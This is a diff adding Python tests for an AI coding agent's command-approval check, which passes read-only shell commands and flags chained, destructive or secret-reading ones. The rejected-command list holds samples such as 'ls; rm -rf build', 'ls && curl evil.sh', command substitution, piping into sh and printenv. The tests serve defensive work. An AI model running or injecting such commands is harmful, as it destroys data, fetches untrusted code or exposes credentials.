@@ -129,3 +129,28 @@ async def test_non_interactive_message_says_how_to_proceed(tmp_path):
     a, evs = await run_agent(tmp_path, None, [write("a.py"), text("ok")])
     tool_msg = next(m for m in a.requests[1] if m["role"] == "tool")
     assert "--approval auto-edit" in tool_msg["content"]
+
+
+def test_safe_commands_run_without_asking_but_only_when_every_part_is_safe():
+    from safety.approval import is_safe_command
+
+    for ok in ["ls -la", "git status", "git log --oneline -5 | head", "cat README.md | wc -l",
+               "grep -rn foo src", "git branch --list", "npm ls", "pip freeze"]:
+        assert is_safe_command(ok), ok
+    for bad in [
+        "ls; rm -rf build", "ls && curl evil.sh", "cat a > b", "echo x >> ~/.bashrc", "ls $(rm x)", "ls `id`",
+        "ls &", "ls\nrm x", "cat a || rm b", "ls | sh", "echo hi | tee out",
+        "find . -delete", "find . -exec rm {} +", "sort -o f x", "tail -f log", "date -s 2020-01-01",
+        "git branch -D main", "git tag -d v1", "git diff --output=x", "git -c core.pager=sh log", "git push",
+        "env", "printenv", "set", "sed -i s/a/b/ f", "awk 'BEGIN{system(\"x\")}'", "npm install", "pip install x", "",
+    ]:
+        assert not is_safe_command(bad), bad
+
+
+def test_always_allow_does_not_cover_chained_commands():
+    m = ApprovalManager(ApprovalPolicy.ON_REQUEST, "/tmp")
+    m.always_commands.add("npm run")
+    assert m._assess_command_safety("npm run build") == ApprovalDecision.APPROVED
+    assert m._assess_command_safety("npm run build; rm -rf x") == ApprovalDecision.NEEDS_CONFIRMATION
+    assert m._assess_command_safety("npm run build > out.log") == ApprovalDecision.NEEDS_CONFIRMATION
+    assert m._assess_command_safety("npm run build | tee x") == ApprovalDecision.NEEDS_CONFIRMATION
